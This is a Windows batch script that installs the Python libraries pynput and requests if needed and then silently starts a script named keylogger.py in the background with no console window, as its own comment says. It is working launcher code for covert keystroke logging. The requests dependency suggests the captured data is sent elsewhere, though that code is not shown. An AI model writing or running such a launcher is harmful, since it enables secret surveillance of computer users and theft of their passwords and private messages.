@echo off
cd %~dp0

:: Check if pynput is installed, if not, install it
python -c "import pynput" 2>nul || pip install pynput

:: Check if requests is installed, if not, install it
python -c "import requests" 2>nul || pip install requests

:: Run the keylogger in the background without a console window
start /b pythonw.exe "%~dp0keylogger.py"

exit

